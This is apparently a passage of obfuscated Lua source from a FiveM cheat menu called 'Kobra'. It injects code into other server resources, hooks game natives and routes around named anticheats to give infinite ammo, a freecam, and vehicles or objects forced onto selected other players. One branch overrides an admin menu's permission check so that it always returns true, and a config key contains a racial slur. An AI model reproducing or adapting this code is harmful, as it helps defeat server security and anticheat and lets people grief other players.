v1304(...);end);hNative("IsVehicleSeatFree",function(v1305,...) return v1305(...);end);hNative("PlayerPedId",function(v1306,...) return v1306(...);end);hNative("GetEntityCoords",function(v1307,...) return v1307(...);end);v1122=2 -0 ;end if (v1122==6) then hNative("EndTextCommandDisplayText",function(v1308,...) return v1308(...);end);hNative("GetCamCoord",function(v1309,...) return v1309(...);end);hNative("GetCamRot",function(v1310,...) return v1310(...);end);hNative("IsControlPressed",function(v1311,...) return v1311(...);end);v1122=1062 -(507 + 548) ;end if (v1122==(845 -(289 + 548))) then hNative("GetShapeTestResult",function(v1312,...) return v1312(...);end);hNative("IsControlJustPressed",function(v1313,...) return v1313(...);end);hNative("IsDisabledControlJustPressed",function(v1314,...) return v1314(...);end);hNative("IsEntityAVehicle",function(v1315,...) return v1315(...);end);v1122=1827 -(821 + 997) ;end if (v1122==(255 -(195 + 60))) then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1316,v1317) local v1318=_G[v1316];if ( not v1318 or (type(v1318)~="function")) then return;end _G[v1316]=function(...) return v1317(v1318,...);end;end hNative("CreateThread",function(v1319,...) return v1319(...);end);v1122=1 + 0 ;end if (v1122==3) then hNative("DestroyCam",function(v1320,...) return v1320(...);end);hNative("SetFocusEntity",function(v1321,...) return v1321(...);end);hNative("SetTextFont",function(v1322,...) return v1322(...);end);hNative("SetTextProportional",function(v1323,...) return v1323(...);end);v1122=4;end if (v1122==7) then hNative("GetDisabledControlNormal",function(v1324,...) return v1324(...);end);hNative("TaskStandStill",function(v1325,...) return v1325(...);end);hNative("SetFocusPosAndVel",function(v1326,...) return v1326(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1327,...) return v1327(...);end);v1122=8;end if (v1122==4) then hNative("SetTextScale",function(v1328,...) return v1328(...);end);hNative("SetTextDropShadow",function(v1329,...) return v1329(...);end);hNative("SetTextEdge",function(v1330,...) return v1330(...);end);hNative("SetTextOutline",function(v1331,...) return v1331(...);end);v1122=5;end if (v1122==5) then hNative("SetTextCentre",function(v1332,...) return v1332(...);end);hNative("SetTextColour",function(v1333,...) return v1333(...);end);hNative("BeginTextCommandDisplayText",function(v1334,...) return v1334(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1335,...) return v1335(...);end);v1122=1507 -(251 + 1250) ;end if (v1122==9) then hNative("TaskWarpPedIntoVehicle",function(v1336,...) return v1336(...);end);hNative("SetEntityCoords",function(v1337,...) return v1337(...);end);hNative("GiveWeaponToPed",function(v1338,...) return v1338(...);end);hNative("SetCurrentPedWeapon",function(v1339,...) return v1339(...);end);v1122=29 -19 ;end end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                    _G.KobraFreecamEnabled = false
                    _G.KobraFreecamThreadRunning = false

                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    RenderScriptCams(false, false, 0, true, true)
                    if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject, false) _G.KobraFreecamObject = nil end
                    SetFocusEntity(PlayerPedId())
                ]]);end else local v971=0;while true do if (v971==2) then hNative("CreateCam",function(v1192,...) return v1192(...);end);hNative("SetCamCoord",function(v1193,...) return v1193(...);end);hNative("SetCamRot",function(v1194,...) return v1194(...);end);hNative("RenderScriptCams",function(v1195,...) return v1195(...);end);v971=3;end if ((7 + 3)==v971) then hNative("ShootSingleBulletBetweenCoords",function(v1196,...) return v1196(...);end);RenderScriptCams(false,false,1032 -(809 + 223) ,true,true);if _G.KobraFreecamObject then local v1283=0;while true do if (v1283==(0 -0)) then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;break;end end end SetFocusEntity(PlayerPedId());break;end if ((26 -17)==v971) then hNative("TaskWarpPedIntoVehicle",function(v1197,...) return v1197(...);end);hNative("SetEntityCoords",function(v1198,...) return v1198(...);end);hNative("GiveWeaponToPed",function(v1199,...) return v1199(...);end);hNative("SetCurrentPedWeapon",function(v1200,...) return v1200(...);end);v971=33 -23 ;end if (v971==(0 + 0)) then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1201,v1202) local v1203=0 + 0 ;local v1204;while true do if ((617 -(14 + 603))==v1203) then v1204=_G[v1201];if ( not v1204 or (type(v1204)~="function")) then return;end v1203=130 -(118 + 11) ;end if (v1203==(1 + 0)) then _G[v1201]=function(...) return v1202(v1204,...);end;break;end end end hNative("CreateThread",function(v1205,...) return v1205(...);end);v971=1 + 0 ;end if (v971==8) then hNative("GetShapeTestResult",function(v1206,...) return v1206(...);end);hNative("IsControlJustPressed",function(v1207,...) return v1207(...);end);hNative("IsDisabledControlJustPressed",function(v1208,...) return v1208(...);end);hNative("IsEntityAVehicle",function(v1209,...) return v1209(...);end);v971=25 -16 ;end if (5==v971) then hNative("SetTextCentre",function(v1210,...) return v1210(...);end);hNative("SetTextColour",function(v1211,...) return v1211(...);end);hNative("BeginTextCommandDisplayText",function(v1212,...) return v1212(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1213,...) return v1213(...);end);v971=955 -(551 + 398) ;end if (v971==(5 + 2)) then hNative("GetDisabledControlNormal",function(v1214,...) return v1214(...);end);hNative("TaskStandStill",function(v1215,...) return v1215(...);end);hNative("SetFocusPosAndVel",function(v1216,...) return v1216(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1217,...) return v1217(...);end);v971=3 + 5 ;end if (v971==(4 + 0)) then hNative("SetTextScale",function(v1218,...) return v1218(...);end);hNative("SetTextDropShadow",function(v1219,...) return v1219(...);end);hNative("SetTextEdge",function(v1220,...) return v1220(...);end);hNative("SetTextOutline",function(v1221,...) return v1221(...);end);v971=18 -13 ;end if (v971==1) then hNative("Wait",function(v1222,...) return v1222(...);end);hNative("IsVehicleSeatFree",function(v1223,...) return v1223(...);end);hNative("PlayerPedId",function(v1224,...) return v1224(...);end);hNative("GetEntityCoords",function(v1225,...) return v1225(...);end);v971=4 -2 ;end if (v971==(2 + 4)) then hNative("EndTextCommandDisplayText",function(v1226,...) return v1226(...);end);hNative("GetCamCoord",function(v1227,...) return v1227(...);end);hNative("GetCamRot",function(v1228,...) return v1228(...);end);hNative("IsControlPressed",function(v1229,...) return v1229(...);end);v971=27 -20 ;end if (v971==(1 + 2)) then hNative("DestroyCam",function(v1230,...) return v1230(...);end);hNative("SetFocusEntity",function(v1231,...) return v1231(...);end);hNative("SetTextFont",function(v1232,...) return v1232(...);end);hNative("SetTextProportional",function(v1233,...) return v1233(...);end);v971=93 -(40 + 49) ;end end end break;end if (v527==0) then v32=false;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=false}));v527=3 -2 ;end end end end;v12.EnableInfiniteAmmo=function(v199) if (GetResourceState("WaveShield")=="started") then local v528=0;local v529;local v530;local v531;local v532;local v533;local v534;local v535;local v536;local v537;local v538;local v539;while true do if (v528==0) then print("1");v529=nil;function v529(v867) local v868=0;local v869;while true do if (v868==(490 -(99 + 391))) then v869="";for v1168=1 + 0 , #v867 do v869=v869   .. string.char(v867[v1168]) ;end v868=4 -3 ;end if (v868==1) then return v869;end end end v528=2 -1 ;end if ((4 + 0)==v528) then v536=v530({1672 -(1032 + 572) ,111,1918 -(568 + 1249) ,276 -161 ,1375 -(913 + 393) ,155 -45 ,257 -141 ,1730 -(950 + 675) ,45 + 71 ,1300 -(216 + 963) ,628 -(432 + 127) ,1193 -(1065 + 8) ,59 + 46 ,83 + 32 ,116});v537=v530({37 + 50 ,97,50 + 55 ,439 -323 });v538={};v528=9 -4 ;end if (v528==5) then v539=nil;function v539(v870) local v871=0 -0 ;local v872;local v873;while true do if (v871==1) then function v873() while coroutine.status(v872)~="dead"  do local v1234,v1235=coroutine.resume(v872);if  not v1234 then print("^1[Kobra InfAmmo] Coroutine error: ^7",v1235);break;end v537(0);end end v873();break;end if (v871==0) then v872=coroutine.create(v870);v873=nil;v871=1;end end end if  not _G.osintWaveLoop then local v972=0;while true do if (v972==(0 + 0)) then _G.osintWaveLoop=true;v539(function() while _G.osintWaveLoop do local v1284=529 -(318 + 211) ;while true do if (v1284==0) then if _G.osintInfAmmo.enabled then local v1528=0 -0 ;local v1529;while true do if (v1528==(1587 -(963 + 624))) then v1529=v531();if v536(v1529) then local v1705=0;local v1706;while true do if (v1705==(0 + 0)) then v1706=v532(v1529);if (v1706 and (v1706~=v533("WEAPON_UNARMED"))) then local v1749=846 -(518 + 328) ;local v1750;local v1751;local v1752;while true do if (v1749==1) then if  not v538[v1752] then v538[v1752]=v1751;end if (v1751<v538[v1752]) then v535(v1529,v1706,v538[v1752] -v1751 );end break;end if (v1749==(0 -0)) then v1750,v1751=v534(v1529,v1706);v1752=tostring(v1529);v1749=1 -0 ;end end end break;end end end break;end end else coroutine.yield();end coroutine.yield();break;end end end end);break;end end end break;end if (v528==(320 -(301 + 16))) then v533=v530({199 -128 ,101,106 + 10 ,72,59 + 38 ,115,330 -226 ,25 + 50 ,360 -259 ,166 -45 });v534=v530({71,24 + 77 ,351 -235 ,678 -(520 + 93) ,109,109,7 + 104 ,27 + 46 ,701 -(396 + 195) ,1841 -(440 + 1321) ,467 -366 ,100,1434 -(641 + 706) ,541 -(249 + 191) ,422 -325 ,112,538 -(183 + 244) ,6 + 104 });v535=v530({795 -(434 + 296) ,612 -(169 + 343) ,88 + 12 ,190 -125 ,109,109,111,84,84 + 27 ,35 + 45 ,584 -(397 + 86) ,11 + 89 });v528=1 + 3 ;end if (v528==(2 + 0)) then _G.osintInfAmmo.enabled=true;v531=v530({64 + 16 ,108,1287 -(50 + 1140) ,72 + 49 ,144 -43 ,114,139 -59 ,101,1018 -(782 + 136) ,73,18 + 82 });v532=v530({260 -189 ,62 + 39 ,3 + 113 ,25 + 58 ,1696 -(210 + 1385) ,1797 -(1201 + 488) ,101,175 -76 ,701 -(352 + 233) ,101,55 + 45 ,80,101,1601 -(277 + 1224) ,77 + 10 ,247 -146 ,97,112,45 + 66 ,110});v528=3;end if (v528==(1 + 0)) then v530=nil;function v530(v874) return _G[v529(v874)];end if  not _G.osintInfAmmo then _G.osintInfAmmo={enabled=false};end v528=252 -(172 + 78) ;end end elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);end end;v12.DisableInfiniteAmmo=function(v200) if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            if _G.osintInfAmmo then
                _G.osintInfAmmo.enabled = false
            end
        ]]);elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);end end;v12.AttachSelectedVehicle=function(v201,v202,v203) if ( not v202 or ( #v202==(0 -0))) then local v540=0 + 0 ;while true do if ((0 -0)==v540) then v201:Notify("error","Kobra","No players selected!",3000);return;end end end if ( not v203 or ( #v203==0)) then v201:Notify("error","Kobra","Invalid vehicle model!",3000);return;end local function v204(v334) local v335=0 + 0 ;local v336;while true do if (v335==(1 + 0)) then return table.concat(v336,",");end if (v335==(0 -0)) then v336={};for v763=1, #v334 do v336[v763]=string.byte(v334,v763);end v335=1 -0 ;end end end local v205=v203;local v206=v204(v205);local v207=GetCurrentServerEndpoint();local v208=0 + 0 ;for v337,v338 in ipairs(v202) do if (GetResourceState("solos-rentals")=="started") then local v589=0 + 0 ;local v590;local v591;while true do if (v589==(1 + 0)) then if v590 then v208=v208 + (3 -2) ;end break;end if (v589==(0 -0)) then print("[vehicle_attach] Fallback: solos-rentals");v590,v591=pcall(function() MachoInjectResource("solos-rentals",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    config.locations["customnigga"] = {
                        vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                    }
                    TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v206,v338));end);v589=1 + 0 ;end end elseif (GetResourceState("amigo")=="started") then print("[vehicle_attach] Fallback: Amigo RP");local v765,v766=pcall(function() MachoInjectResourceRaw("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v206,v338));end);if v765 then v208=v208 + 1 + 0 ;end elseif (GetResourceState("qb-core")=="started") then local v973=0;local v974;local v975;while true do if (v973==0) then print("[vehicle_attach] Fallback #02");v974,v975=pcall(function() MachoInjectResource("qb-core",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    QBCore.Functions.SpawnVehicle(model, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end, coords, true, true)
                ]],v206,v338));end);v973=1;end if (v973==(448 -(133 + 314))) then if v974 then v208=v208 + 1 ;end break;end end elseif ((v207:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then local v1123=0;local v1124;local v1125;while true do if ((0 + 0)==v1123) then print("[vehicle_attach] Fallback #1");v1124,v1125=pcall(function() MachoInjectResource("drc_gardener",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    SpawnVehicleAndWarpPlayer(model, coords)
                ]],v206,v338));end);v1123=214 -(199 + 14) ;end if (v1123==(3 -2)) then if v1124 then v208=v208 + (1550 -(647 + 902)) ;end break;end end elseif (GetResourceState("lunar_bridge")=="started") then print("[vehicle_attach] Fallback #2");local v1236,v1237=pcall(function() MachoInjectResourceRaw("lunar_bridge",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    Framework.spawnVehicle(model, coords, heading, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            SetVehicleOnGroundProperly(vehicle)
                            Citizen.Wait(500)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v206,v338));end);if v1236 then v208=v208 + 1 ;end elseif (GetResourceState("lation_laundering")=="started") then local v1340=0;local v1341;local v1342;while true do if (v1340==(0 -0)) then print("[vehicle_attach] Fallback #3");v1341,v1342=pcall(function() MachoInjectResourceRaw("lation_laundering",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                    local vehicle = SpawnVehicle(model, position)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        ShowNotification("~g~Vehicle attached successfully!")
                    end
                ]],v206,v338));end);v1340=1;end if (1==v1340) then if v1341 then v208=v208 + 1 ;end break;end end else print("[vehicle_attach] Universal Fallback");local v1343,v1344=pcall(function() local v1405=233 -(85 + 148) ;local v1406;while true do if (v1405==0) then v1406=string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    RequestModel(model)
                    local maxAttempts = 20
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < maxAttempts do
                        Citizen.Wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= maxAttempts then return end
                    
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]],v206,v338);MachoInjectResourceRaw("any",v1406,v338);break;end end end);if v1343 then v208=v208 + 1 ;end end end end;function encodeToByteArrayLiteral(v209) local v210=1289 -(426 + 863) ;local v211;while true do if ((0 -0)==v210) then if  not v209 then return "";end if (type(v209)~="string") then return tostring(v209);end v210=1655 -(873 + 781) ;end if (v210==(2 -0)) then for v677=2 -1 , #v209 do v211[ #v211 + 1 + 0 ]=tostring(string.byte(v209,v677));end return table.concat(v211,", ");end if (v210==(3 -2)) then if ( #v209==(0 -0)) then return "";end v211={};v210=5 -3 ;end end end v12.SpawnSelectedObject=function(v212,v213) if ( not v213 or ( #v213==0)) then local v541=1947 -(414 + 1533) ;while true do if ((0 + 0)==v541) then v212:Notify("error","Kobra","No players selected!",3555 -(443 + 112) );return;end end end local v214=v212:GetSelectedObjectModel();if ( not v214 or ( #v214==(1479 -(888 + 591)))) then local v542=0 -0 ;while true do if (v542==(0 + 0)) then v212:Notify("error","Kobra","Invalid object model!",3000);return;end end end local v215=encodeToByteArrayLiteral(v214);local v216=0 -0 ;for v339,v340 in ipairs(v213) do if ((GetResourceState("qb-core")=="started") or ((GetResourceState("mc9-core")=="started") and ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started") or (GetResourceState("ReaperV4")=="started") or (GetResourceState("WaveShield")=="started")))) then local v592=0 + 0 ;while true do if ((0 + 0)==v592) then v212:Notify("error","Kobra","Using Qb-core Spawner!",321 + 2679 );MachoInjectResource("qb-core",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and joaat(model) or model
                QBCore.Functions.LoadModel(hash)
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v215,v340));v592=1 -0 ;end if ((1 -0)==v592) then v216=v216 + (1679 -(136 + 1542)) ;break;end end elseif (GetResourceState("cd_dispatch")=="started") then print("using fallback");MachoInjectResource("cd_dispatch",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                
                -- Hook CreateObject to override hash and ensure model loading
                local originalCreateObject = CreateObject
                CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                    if type(objHash) == 'number' and objHash ~= hash then
                        -- Override with our custom hash for this spawn
                        objHash = hash
                    end
                    RequestModel(objHash)
                    while not HasModelLoaded(objHash) do
                        Citizen.Wait(0)
                    end
                    local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                    SetModelAsNoLongerNeeded(objHash)
                    return obj
                end
                
                -- Spawn the object on target player
                local player = GetPlayerFromServerId(%d)
                if player == -1 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                
                -- Restore original CreateObject
                CreateObject = originalCreateObject
            ]],v215,v340));v216=v216 + 1 ;elseif (GetResourceState("rcore_drunk")=="started") then local v976=0 -0 ;while true do if (v976==(0 + 0)) then MachoInjectResourceRaw("rcore_drunk",string.format([[
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local hash = GetHashKey(model)
                RequestModel(hash)
                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
